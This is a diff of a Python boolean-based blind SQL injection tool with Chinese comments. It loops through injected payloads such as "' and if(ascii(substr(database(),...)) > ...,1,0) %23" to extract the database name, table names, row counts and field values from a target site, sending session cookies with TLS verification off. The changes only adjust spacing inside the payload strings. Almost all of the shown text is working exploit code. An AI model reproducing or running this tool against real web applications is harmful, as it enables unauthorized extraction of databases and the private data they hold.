@@ -21,7 +21,7 @@ class SchemaName():  # 爆数据库名
 
     def length_schema(self):  # 猜解数据库名的长度
         for i in range(1,99):
-            payload = "' and if(length(database()) = {0},1,0) %23"
+            payload = "' and if(length(database()) = {0}, 1, 0) %23"
             url = self.url + payload
             res = requests.get(url = url.format(i), cookies=self.cookie, verify=False)
             if self.true_str in res.text:
@@ -32,7 +32,7 @@ class SchemaName():  # 爆数据库名
 
     def schema_name(self,length):
         database_name = ''
-        payload = "' and if(ascii(substr(database(),{0},1)) > {1},1,0) %23"
+        payload = "' and if(ascii(substr(database(),{0},1)) > {1}, 1, 0) %23"
         url = self.url + payload
         for a in range(1, length + 1):
             left = 0
@@ -93,7 +93,7 @@ class TableName():  # 爆表名
 
         tablename = ''
         for y in range(1, tablelens+1):
-            payload = "' and if(ascii(substr((select table_name from information_schema.tables where table_schema= '{0}' limit {1},1),{2},1)) > {3},1,0) %23"
+            payload = "' and if(ascii(substr((select table_name from information_schema.tables where table_schema= '{0}' limit {1},1),{2},1)) > {3}, 1, 0) %23"
             url = self.url + payload
             left = 0
             right = 127
@@ -210,7 +210,7 @@ class DateValue():
 
     def DataValue_number(self):
         for DBDataCount in range(99):
-            payload = "'and if ((select count({0}) from {1})={2},1,0) %23"
+            payload = "'and if ((select count({0}) from {1}) = {2}, 1, 0) %23"
             url = self.url + payload
             res = requests.get(url=url.format(self.column_name, self.table_name, DBDataCount), cookies=self.cookie, verify=False)
             if self.true_str in res.text:
@@ -224,7 +224,7 @@ class DateValue():
         #获取字段长度
         datalens = 0
         for datalen in range(1,99):
-            payload = "'and if ((select length({0}) from {1} limit {2},1) = {3},1,0) %23"
+            payload = "'and if ((select length({0}) from {1} limit {2},1) = {3}, 1, 0) %23"
             url = self.url + payload
             res = requests.get(url.format(self.column_name,self.table_name, x, datalen), cookies=self.cookie, verify=False)
             if self.true_str in res.content.decode("utf-8"):
@@ -234,7 +234,7 @@ class DateValue():
 
         datavalue = ''
         for y in range(1, datalens+1):
-            payload = "'and if (ascii(substr((select {0} from {1} limit {2},1),{3},1)) > {4},1,0) %23"
+            payload = "'and if (ascii(substr((select {0} from {1} limit {2}, 1), {3}, 1)) > {4}, 1, 0) %23"
             url = self.url + payload
             left = 0
             right = 127
